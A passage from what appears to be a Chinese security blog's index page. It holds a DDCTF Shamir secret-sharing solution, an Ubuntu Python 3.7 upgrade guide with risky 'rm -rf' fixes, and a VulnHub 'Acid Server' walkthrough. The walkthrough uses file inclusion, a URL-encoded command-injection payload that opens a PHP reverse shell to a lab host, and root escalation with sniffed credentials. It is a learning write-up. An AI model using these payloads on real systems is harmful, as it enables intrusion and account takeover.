class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;&apos;</span><br><span class="line">The following Python implementation of Shamir&apos;s Secret Sharing is</span><br><span class="line">released into the Public Domain under the terms of CC0 and OWFa:</span><br><span class="line">https://creativecommons.org/publicdomain/zero/1.0/</span><br><span class="line">http://www.openwebfoundation.org/legal/the-owf-1-0-agreements/owfa-1-0</span><br><span class="line"></span><br><span class="line">See the bottom few lines for usage. Tested on Python 2 and 3.</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">from __future__ import division</span><br><span class="line">from __future__ import print_function</span><br><span class="line"></span><br><span class="line">import random</span><br><span class="line">import functools</span><br><span class="line"></span><br><span class="line"># 12th Mersenne Prime</span><br><span class="line"># (for this application we want a known prime number as close as</span><br><span class="line"># possible to our security level; e.g.  desired security level of 128</span><br><span class="line"># bits -- too large and all the ciphertext is large; too small and</span><br><span class="line"># security is compromised)</span><br><span class="line">_PRIME = 2**127 - 1</span><br><span class="line"># 13th Mersenne Prime is 2**521 - 1</span><br><span class="line"></span><br><span class="line">_RINT = functools.partial(random.SystemRandom().randint, 0)</span><br><span class="line"></span><br><span class="line">def _eval_at(poly, x, prime):</span><br><span class="line">    &apos;&apos;&apos;evaluates polynomial (coefficient tuple) at x, used to generate a</span><br><span class="line">    shamir pool in make_random_shares below.</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    accum = 0</span><br><span class="line">    for coeff in reversed(poly):</span><br><span class="line">        accum *= x</span><br><span class="line">        accum += coeff</span><br><span class="line">        accum %= prime</span><br><span class="line">    return accum</span><br><span class="line"></span><br><span class="line">def make_random_shares(minimum, shares, prime=_PRIME):</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    Generates a random shamir pool, returns the secret and the share</span><br><span class="line">    points.</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    if minimum &gt; shares:</span><br><span class="line">        raise ValueError(&quot;pool secret would be irrecoverable&quot;)</span><br><span class="line">    poly = [_RINT(prime) for i in range(minimum)]</span><br><span class="line">    points = [(i, _eval_at(poly, i, prime))</span><br><span class="line">              for i in range(1, shares + 1)]</span><br><span class="line">    return poly[0], points</span><br><span class="line"></span><br><span class="line">def _extended_gcd(a, b):</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    division in integers modulus p means finding the inverse of the</span><br><span class="line">    denominator modulo p and then multiplying the numerator by this</span><br><span class="line">    inverse (Note: inverse of A is B such that A*B % p == 1) this can</span><br><span class="line">    be computed via extended Euclidean algorithm</span><br><span class="line">    http://en.wikipedia.org/wiki/Modular_multiplicative_inverse#Computation</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    x = 0</span><br><span class="line">    last_x = 1</span><br><span class="line">    y = 1</span><br><span class="line">    last_y = 0</span><br><span class="line">    while b != 0:</span><br><span class="line">        quot = a // b</span><br><span class="line">        a, b = b, a%b</span><br><span class="line">        x, last_x = last_x - quot * x, x</span><br><span class="line">        y, last_y = last_y - quot * y, y</span><br><span class="line">    return last_x, last_y</span><br><span class="line"></span><br><span class="line">def _divmod(num, den, p):</span><br><span class="line">    &apos;&apos;&apos;compute num / den modulo prime p</span><br><span class="line"></span><br><span class="line">    To explain what this means, the return value will be such that</span><br><span class="line">    the following is true: den * _divmod(num, den, p) % p == num</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    inv, _ = _extended_gcd(den, p)</span><br><span class="line">    return num * inv</span><br><span class="line"></span><br><span class="line">def _lagrange_interpolate(x, x_s, y_s, p):</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    Find the y-value for the given x, given n (x, y) points;</span><br><span class="line">    k points will define a polynomial of up to kth order</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    k = len(x_s)</span><br><span class="line">    assert k == len(set(x_s)), &quot;points must be distinct&quot;</span><br><span class="line">    def PI(vals):  # upper-case PI -- product of inputs</span><br><span class="line">        accum = 1</span><br><span class="line">        for v in vals:</span><br><span class="line">            accum *= v</span><br><span class="line">        return accum</span><br><span class="line">    nums = []  # avoid inexact division</span><br><span class="line">    dens = []</span><br><span class="line">    for i in range(k):</span><br><span class="line">        others = list(x_s)</span><br><span class="line">        cur = others.pop(i)</span><br><span class="line">        nums.append(PI(x - o for o in others))</span><br><span class="line">        dens.append(PI(cur - o for o in others))</span><br><span class="line">    den = PI(dens)</span><br><span class="line">    num = sum([_divmod(nums[i] * den * y_s[i] % p, dens[i], p)</span><br><span class="line">               for i in range(k)])</span><br><span class="line">    return (_divmod(num, den, p) + p) % p</span><br><span class="line"></span><br><span class="line">def recover_secret(shares, prime=_PRIME):</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    Recover the secret from share points</span><br><span class="line">    (x,y points on the polynomial)</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    if len(shares) &lt; 2:</span><br><span class="line">        raise ValueError(&quot;need at least two shares&quot;)</span><br><span class="line">    x_s, y_s = zip(*shares)</span><br><span class="line">    return _lagrange_interpolate(0, x_s, y_s, prime)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    p=0xC45467BBF4C87D781F903249243DF8EE868EBF7B090203D2AB0EDA8EA48719ECE9B914F9F5D0795C23BF627E3ED40FBDE968251984513ACC2B627B4A483A6533</span><br><span class="line">    a1=(1,0x729FB38DB9E561487DCE6BC4FB18F4C7E1797E6B052AFAAF56B5C189D847EAFC4F29B4EB86F6E678E0EDB1777357A0A33D24D3301FC9956FFBEA5EA6B6A3D50E)</span><br><span class="line">    a2=(2,0x478B973CC7111CD31547FC1BD1B2AAD19522420979200EBA772DECC1E2CFFCAE34771C49B5821E9C0DDED7C24879484234C8BE8A0B607D8F7AF0AAAC7C7F19C6)</span><br><span class="line">    a4=(4,0xBFCFBAD74A23B3CC14AF1736C790A7BC11CD08141FB805BCD9227A6E9109A83924ADEEDBC343464D42663AB5087AE26444A1E42B688A8ADCD7CF2BA7F75CD89D)</span><br><span class="line">    b3=(3,0x9D3D3DBDDA2445D0FE8C6DFBB84C2C30947029E912D7FB183C425C645A85041419B89E25DD8492826BD709A0A494BE36CEF44ADE376317E7A0C70633E3091A61)</span><br><span class="line">    b4=(4,0x79F9F4454E84F32535AA25B8988C77283E4ECF72795014286707982E57E46004B946E42FB4BE9D22697393FC7A6C33A27CE0D8BFC990A494C12934D61D8A2BA8)</span><br><span class="line">    b5=(5,0x2A074DA35B3111F1B593F869093E5D5548CCBB8C0ADA0EBBA936733A21C513ECF36B83B7119A6F5BEC6F472444A3CE2368E5A6EBF96603B3CD10EAE858150510)</span><br><span class="line">    shares=[a1,a2,a4,b3,b4,b5]</span><br><span class="line">    r1=recover_secret(shares[:3],p)</span><br><span class="line">    r2=recover_secret(shares[-3:],p)</span><br><span class="line">    print(hex(r1))</span><br><span class="line">    print(hex(r2))</span><br><span class="line">    r3=r1^r2</span><br><span class="line">    print(hex(r3))</span><br><span class="line">    c1=(1,r1)</span><br><span class="line">    c2=(2,r2)</span><br><span class="line">    shares=[c1,c2]</span><br><span class="line">    r4=recover_secret(shares,p)</span><br><span class="line">    print(hex(r4))</span><br><span class="line">    print(hex(r4)[2:-1].decode(&apos;hex&apos;))</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
<p>得到答案：</p>
<blockquote>
<p>0x5f9fa97581c7b20f16c60d61cf3973bc308f5014756e7e6679dfc1b1931e4ab9853f962def6eefe68fb3fba2263d5cd1b4c13ebf08a5efcd2a3db8bf65aeb401L<br>0xbf3f52eb038f641e2d8c1ac39e72e778611ea028eadcfcccf37b3f1fd1f619fcc44cf9f36f719997b6fbc1d31c234c3123284812b71a9b57f02422377bfafc85L<br>0xe0a0fb9e8248d6113b4a17a2514b94c45191f03c9fb282aa8aa4feae42e8534541736fde801f767139483a713a1e10e097e976adbfbf749ada199a881e544884L<br>0x44444354467b76463232686f6c4635686c357130576d72465a356b5a31444264574f474f626b7dL<br>DDCTF{vF22holF5hl5q0WmrFZ5kZ1DBdWOGObk}</p>
</blockquote>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/ctf/">ctf</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/04/20/python/upgrade python3/"><span>Ubuntu升级python3.7</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/04/20/python/upgrade python3/" rel="bookmark">
        <time class="entry-date published" datetime="2019-04-20T05:17:47.904Z">
          2019-04-20
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="Ubuntu升级python3-7"><a href="#Ubuntu升级python3-7" class="headerlink" title="Ubuntu升级python3.7"></a>Ubuntu升级python3.7</h1><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>下载源码</p>
<pre><code>wget https://www.python.org/ftp/python/3.7.3/Python-3.7.3.tgz
</code></pre><p>解压源码</p>
<pre><code>tar -xvzf Python-3.7.3.tgz
</code></pre><p>进入目录</p>
<pre><code>cd Python-3.7.3
</code></pre><p>配置安装路径</p>
<pre><code>./configure --with-ssl --prefix=/usr/local/python3
</code></pre><p>安装python3.7.1依赖</p>
<pre><code>#sudo apt-get update
#sudo apt-get upgrade
#sudo apt-get dist-upgrade
sudo apt-get install build-essential python-dev python-setuptools python-pip python-smbus libncursesw5-dev libgdbm-dev libc6-dev zlib1g-dev libsqlite3-dev tk-dev libssl-dev openssl libffi-dev
</code></pre><p>编译</p>
<pre><code>make
</code></pre><p>安装</p>
<pre><code>sudo make install
</code></pre><p>删除软链接</p>
<pre><code>sudo rm -rf /usr/bin/python3
sudo rm -rf /usr/bin/pip3
</code></pre><p>新建软链接</p>
<pre><code>sudo ln -s /usr/local/python3/bin/python3.7 /usr/bin/python3
sudo ln -s /usr/local/python3/bin/pip3.7 /usr/bin/pip3
</code></pre><p>检查是否安装成功</p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ul>
<li>运行pip3出现<strong>subprocess.CalledProcessError: Command ‘(‘lsb_release’, ‘-a’)’ returned non-zero exit status 1</strong></li>
</ul>
<blockquote>
<p>解决办法：rm /usr/bin/lsb_release</p>
</blockquote>
<ul>
<li>make install 出现<strong>ModuleNotFoundError: No module named ‘_ctypes‘</strong></li>
</ul>
<blockquote>
<p>apt install libffi-devel</p>
</blockquote>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><blockquote>
<p>软件的生命周期中一般分4个版本，RC 和 Beta分别是其中2种。如下是4种的解释：<br><strong>alpha</strong>版：内部测试版。α是希腊字母的第一个，表示最早的版本，一般用户不要下载这个版本，这个版本包含很多BUG，功能也不全，主要是给开发人员和 测试人员测试和找BUG用的。<br><strong>beta</strong>版：公开测试版。β是希腊字母的第二个，顾名思义，这个版本比alpha版发布得晚一些，主要是给“部落”用户和忠实用户测试用的，该版本任然存 在很多BUG，但是相对alpha版要稳定一些。这个阶段版本的软件还会不断增加新功能。如果你是发烧友，可以下载这个版本。<br><strong>rc</strong>版：全写：Release Candidate（候选版本），该版本又较beta版更进一步了，该版本功能不再增加，和最终发布版功能一样。这个版本有点像最终发行版之前的一个类似 预览版，这个的发布就标明离最终发行版不远了。作为普通用户，如果你很急着用这个软件的话，也可以下载这个版本。<br><strong>stable</strong>版：稳定版。在开源软件中，都有stable版，这个就是开源软件的最终发行版，用户可以放心大胆的用了。</p>
</blockquote>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/tutorial/">tutorial</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/04/17/靶机/acid/"><span>acid server靶机渗透</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/04/17/靶机/acid/" rel="bookmark">
        <time class="entry-date published" datetime="2019-04-17T10:49:14.470Z">
          2019-04-17
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="acid-server靶机渗透"><a href="#acid-server靶机渗透" class="headerlink" title="acid server靶机渗透"></a>acid server靶机渗透</h1><p>虚拟机地址：<a href="https://download.vulnhub.com/acid/Acid.rar" target="_blank" rel="noopener">https://download.vulnhub.com/acid/Acid.rar</a></p>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>开启acid，不用登陆，已启用服务</p>
<p>靶机描述：</p>
<blockquote>
<p>The named of the Virtual machine is “Acid Server”. This Virtual Machine is completely web based. I have added little new concept here and hope people will enjoy solving this.You need to extract the rar and run the vmx using VMplayer . The machine has DHCP active list so once automatically assign an IP network, the next step will be to identify the target and discover the / the service / s to start the game.</p>
</blockquote>
<ul>
<li>先使用nmap扫描内网存活主机：<code>nmap -sP 192.168.199.0/24</code>,找到靶机地址：<strong>192.168.199.186</strong></li>
<li>然后就是端口扫描：<code>nmap -sS -sV -p1-65535 192.168.199.186</code>，扫出一个端口：<blockquote>
<p>PORT      STATE SERVICE VERSION<br>33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))<br>MAC Address: 00:0C:29:28:EB:0D (VMware)</p>
</blockquote>
</li>
</ul>
<ul>
<li><a href="https://nmap.org/man/zh/man-port-scanning-techniques.html" target="_blank" rel="noopener">nmap使用</a></li>
</ul>
<ul>
<li>在地址栏输入：<code>192.168.199.186：33447</code>，看到一个页面</li>
</ul>
<p><img src="https://i.imgur.com/Q1HgsPl.png" alt=""> </p>
<p>纯静态，于是查看源码，在最底部发现<code>&lt;!--0x643239334c6d70775a773d3d--&gt;</code>，将hex转ascii，得到<code>d293LmpwZw==</code>，再base64解码，得到<strong>wow.jpg</strong>，于是访问<code>/images/wow.jpg</code>，将图片下载下来，winhex查看，在最底部发现一串hex，再次解码得到一个md5，将其解密：63425</p>
<ul>
<li><p>先以为<strong>63425</strong>为acid的root密码，结果发现是我太天真了，后来参考别人的writeup，发现了又一个目录扫描工具：<a href="https://sourceforge.net/projects/dirbuster/" target="_blank" rel="noopener">dirbuster</a></p>
</li>
<li><p>扫描目录，发现了<strong>Challenge</strong>目录，输入得到一个登录页面：</p>
</li>
</ul>
<p><img src="https://i.imgur.com/fZ3qzuQ.png" alt=""></p>
<ul>
<li><p>找寻其他线索，根据得到的文件<br><img src="https://i.imgur.com/Rbugaap.png" alt=""></p>
</li>
<li><p>最终在<strong>hacked.php</strong>中得到如下页面<br><img src="https://i.imgur.com/Y5usvFS.png" alt=""></p>
</li>
<li><p>在<strong>/Challenge/include.php</strong>中得到如下页面<br><img src="https://i.imgur.com/kn0kdi2.png" alt=""></p>
</li>
</ul>
<p>发现<code>include.php?file=//etc/passwd</code>可以进行任意文件读取：<br><img src="https://i.imgur.com/Ls58fum.png" alt=""></p>
<ul>
<li>利用<code>php://filter/read=convert.base64-encode/resource=xxx.php</code>读文件，读到<strong>psl-config.php</strong>中有如下代码：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(&quot;HOST&quot;, &quot;localhost&quot;); 			// The host you want to connect to. </span><br><span class="line">define(&quot;USER&quot;, &quot;root&quot;); 			// The database username. </span><br><span class="line">define(&quot;PASSWORD&quot;, &quot;mehak&quot;); 	// The database password. </span><br><span class="line">define(&quot;DATABASE&quot;, &quot;secure_login&quot;);             // The database name.</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Who can register and what the default role will be</span><br><span class="line"> * Values for who can register under a standard setup can be:</span><br><span class="line"> *      any  == anybody can register (default)</span><br><span class="line"> *      admin == members must be registered by an administrator</span><br><span class="line"> *      root  == only the root user can register members</span><br><span class="line"> * </span><br><span class="line"> * Values for default role can be any valid role, but it&apos;s hard to see why</span><br><span class="line"> * the default &apos;member&apos; value should be changed under the standard setup.</span><br><span class="line"> * However, additional roles can be added and so there&apos;s nothing stopping</span><br><span class="line"> * anyone from defining a different default.</span><br><span class="line"> */</span><br><span class="line">define(&quot;CAN_REGISTER&quot;, &quot;any&quot;);</span><br><span class="line">define(&quot;DEFAULT_ROLE&quot;, &quot;member&quot;);</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Is this a secure connection?  The default is FALSE, but the use of an</span><br><span class="line"> * HTTPS connection for logging in is recommended.</span><br><span class="line"> * </span><br><span class="line"> * If you are using an HTTPS connection, change this to TRUE</span><br><span class="line"> */</span><br><span class="line">define(&quot;SECURE&quot;, FALSE);    // For development purposes only!!!!</span><br></pre></td></tr></table></figure>
<ul>
<li>但是啊，没有mysql的地址</li>
</ul>
<p>尝试查看配置文件和环境变量，但依然无果，没想到啊，我真的服了，看到cake.php页面突然发现了猫腻<br><img src="https://i.imgur.com/omqkETQ.png" alt=""></p>
<p>于是尝试/Magic_Box目录，再次爆破，又发现了：</p>
<blockquote>
<p>command.php<br>low.php</p>
</blockquote>
<p>进入<code>http://192.168.199.186:33447/Challenge/Magic_Box/command.php</code>，如下页面：<br><img src="https://i.imgur.com/f2GO1Ry.png" alt=""></p>
<p>向指定地址发送IP数据包，于是想到反弹shell<br>利用<strong>include.php</strong>查看<strong>command.php</strong>源码:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once &apos;../includes/db_connect.php&apos;;</span><br><span class="line">include_once &apos;../includes/functions.php&apos;;</span><br><span class="line">if( isset( $_POST[ &apos;submit&apos; ] ) ) &#123;</span><br><span class="line">$target = $_REQUEST[ &apos;IP&apos; ];</span><br><span class="line"></span><br><span class="line">if (stristr(php_uname(&apos;s&apos;), &apos;Windows NT&apos;)) &#123; </span><br><span class="line">$cmd = shell_exec( &apos;ping  &apos; . $target );</span><br><span class="line">$html .= &apos;&lt;pre&gt;&apos;.$cmd.&apos;&lt;/pre&gt;&apos;;</span><br><span class="line">&#125; else &#123; </span><br><span class="line">$cmd = shell_exec( &apos;ping  -c 3 &apos; . $target );</span><br><span class="line">$html .= &apos;&lt;pre&gt;&apos;.$cmd.&apos;&lt;/pre&gt;&apos;;</span><br><span class="line">echo &quot;$cmd&lt;/br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">		&lt;link rel=&quot;stylesheet&quot; href=&quot;../css/style.css&quot;&gt;</span><br><span class="line">		&lt;link rel=&quot;stylesheet&quot; href=&quot;../styles/main.css&quot; /&gt;</span><br><span class="line">		&lt;title&gt;Reverse Kunfu&lt;/title&gt;</span><br><span class="line">	&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;div class=&quot;wrapper&quot;&gt;</span><br><span class="line">                	&lt;div class=&quot;container&quot;&gt;</span><br><span class="line">			        &lt;p&gt; &lt;h1&gt;You are 1337 Hax0r. Keep your patiene and proceed further.&lt;/h1&gt; &lt;br&gt; </span><br><span class="line">				&lt;form method=&quot;post&quot; action=&quot;&lt;?php $_PHP_SELF ?&gt;&quot;&gt;</span><br><span class="line">				Enter the Host to Ping:&lt;input name=&quot;IP&quot; placeholder=&quot;IP ADDRESS&quot; type=&quot;text&quot; id=&quot;IP&quot; maxlength=&quot;200&quot;&gt;</span><br><span class="line">				&lt;input name=&quot;submit&quot; type=&quot;submit&quot; id=&quot;submit&quot; value=&quot;submit&quot;&gt;</span><br><span class="line">				&lt;/body&gt;</span><br><span class="line">				&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>有两个函数要注意：<br><strong>stristr()</strong></p>
<blockquote>
<p>stristr() 函数搜索字符串在另一字符串中的第一次出现</p>
</blockquote>
<p><strong>php_uname</strong></p>
<blockquote>
<ol>
<li><p>说明<br>　　php_uname — 返回运行 PHP 的系统的有关信息。<br>　　原型：string php_uname ([ string $mode = “a” ] )。返回运行php的操作系统的相关描述，和 phpinfo() 最顶端上输出的是同一个字符串。 如果仅仅要获取操作系统的名称。可以考虑使用常量 PHP_OS，不过要注意该常量会包含 PHP 构建（built）时的操作系统名。</p>
</li>
<li><p>参数<br>　　mode 是单个字符，用于定义要返回什么信息：</p>
</li>
</ol>
<p>‘a’：此为默认。包含序列 “s n r v m” 里的所有模式。<br>’s’：操作系统名称。例如： FreeBSD。<br>‘n’：主机名。例如： localhost.example.com。<br>‘r’：版本名称，例如： 5.1.2-RELEASE。<br>‘v’：版本信息。操作系统之间有很大的不同。<br>‘m’：机器类型。例如：i386。</p>
</blockquote>
<p>伪造useragent为windows nt<br>再输入如下参数：<code>192.168.199.138%3b%70%68%70%20%2d%72%20%27%24%73%6f%63%6b%3d%66%73%6f%63%6b%6f%70%65%6e%28%22%31%39%32%2e%31%36%38%2e%31%39%39%2e%32%33%38%22%2c%38%38%38%38%29%3b%65%78%65%63%28%22%2f%62%69%6e%2f%73%68%20%2d%69%20%3c%26%33%20%3e%26%33%20%32%3e%26%33%22%29%3b%27%0a</code>，得到shell，下一步则是提权</p>
<ul>
<li><p>查看内核<code>uname -a</code></p>
<blockquote>
<p>Linux acid 3.19.0-15-generic #15-Ubuntu SMP Thu Apr 16 23:32:01 UTC 2015 i686 i686 i686 GNU/Linux</p>
</blockquote>
</li>
<li><p>查看发行版本<code>cat /etc/issue</code>,没东西</p>
</li>
<li><p>查看详细信息<code>cat /etc/*-release</code></p>
<blockquote>
<p>DISTRIB_ID=Ubuntu<br>DISTRIB_RELEASE=15.04<br>DISTRIB_CODENAME=vivid<br>DISTRIB_DESCRIPTION=”Ubuntu 15.04”<br>NAME=”Ubuntu”<br>VERSION=”15.04 (Vivid Vervet)”<br>ID=ubuntu<br>ID_LIKE=debian<br>PRETTY_NAME=”Ubuntu 15.04”<br>VERSION_ID=”15.04”<br>HOME_URL=”<a href="http://www.ubuntu.com/" target="_blank" rel="noopener">http://www.ubuntu.com/</a>“<br>SUPPORT_URL=”<a href="http://help.ubuntu.com/" target="_blank" rel="noopener">http://help.ubuntu.com/</a>“<br>BUG_REPORT_URL=”<a href="http://bugs.launchpad.net/ubuntu/" target="_blank" rel="noopener">http://bugs.launchpad.net/ubuntu/</a>“</p>
</blockquote>
</li>
</ul>
<p>无法使用<code>vim</code>、<code>nano</code>，<code>ll</code>无法使用但可用<code>ls -ll</code>代替，<code>searchsploit linux 3.9 ubuntu priv esc</code>也没找到exp</p>
<p>于是就可以利用su提权</p>
<blockquote>
<p>1、su命令</p>
<p>su命令用来切换用户，substitute英文含义“代替”的意思</p>
<p>①su：不加用户名默认是切换为root用户，切当前目录不改变，其他环境变量不变</p>
<p>②su - 或者su -l 或者 su –login：切换为root用户，同时变更工作目录，以及SHELL,USER，PATH，HOME,LOGNAME变量</p>
<p>③su username ：切换为其他用户，目录不改变，SHELL,USER，PATH，HOME,LOGNAME变量改变</p>
<p>④su  -, -l, –login username：切换到其他用户，变更工作目录，以及SHELL,USER，PATH，HOME,LOGNAME变量</p>
<p>​⑤其他参数：</p>
<p>2、sudo命令</p>
<p>sudo命令：sudo为superuser do 的简写，即使用超级用户来执行命令，一般是指root用户</p>
<p>sudoers文件存放在etc目录下，我们可以直接输入命令visudo编辑sudoers文件，使用visudo命令编辑文件，会验证我们添加的信息是否有语法错误</p>
</blockquote>
<p><code>su</code>和<code>su -</code></p>
<blockquote>
<p>su命令和su -命令最大的本质区别就是：前者只是切换了root身份，但Shell环境仍然是普通用户的Shell；而后者连用户和Shell环境一起切换成root身份了 </p>
</blockquote>
<p>但无法使用su命令，于是可以新建一个会话，指令如下（这里有一点坑了很久，必须先su提权，否则在后面的ssh就会失败）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;import pty; pty.spawn(&apos;/bin/bash&apos;)&quot; &gt; /tmp/asdf.py</span><br><span class="line"></span><br><span class="line">python /tmp/asdf.py</span><br></pre></td></tr></table></figure></p>
<ul>
<li><code>cat /etc/passwd</code>查看有哪些用户</li>
<li><code>find \ -user acid 2&gt;/dev/null</code>找文件试图找出线索，发现了<strong>/sbin/raw_vs_isi/hint.pcapng</strong></li>
</ul>
<p>利用scp进行文件传输：<code>scp -P22 /sbin/raw_vs_isi/hint.pcapng root@192.168.199.238:/root/</code><br><a href="https://www.cnblogs.com/jasonHome/p/6033784.html" target="_blank" rel="noopener">Linux的几种文件传输命令</a><br>然后再在kali上用wireshark查看，分析tcp包，找到一个用户和密码：<strong>saman;1337hax0r</strong></p>
<ul>
<li>sudo saman成功登录</li>
<li>sudo root，密码相同，然后在<strong>/root/flag.txt</strong></li>
</ul>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/靶机/">靶机</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/04/15/vulnerable/ssrf/"><span>ssrf</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/04/15/vulnerable/ssrf/" rel="bookmark">
        <time class="entry-date published" datetime="2019-04-15T14:41:35.183Z">
          2019-04-15
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><h2 id="常见绕过方式"><a href="#常见绕过方式" class="headerlink" title="常见绕过方式"></a>常见绕过方式</h2><p>八进制、十进制、十六进制：<br>利用nip.io:<br>302跳转：<br>dns重绑定：<br>利用网站：<a href="https://qiita.com/shimoju/items/81ed5055d2fec5bb9c1e" target="_blank" rel="noopener">https://qiita.com/shimoju/items/81ed5055d2fec5bb9c1e</a><br>自定义：</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/ssrf/">ssrf</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/04/13/转载/国外安全网站/"><span>分享一些国外著名的黑客技术学习网站</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/04/13/转载/国外安全网站/" rel="bookmark">
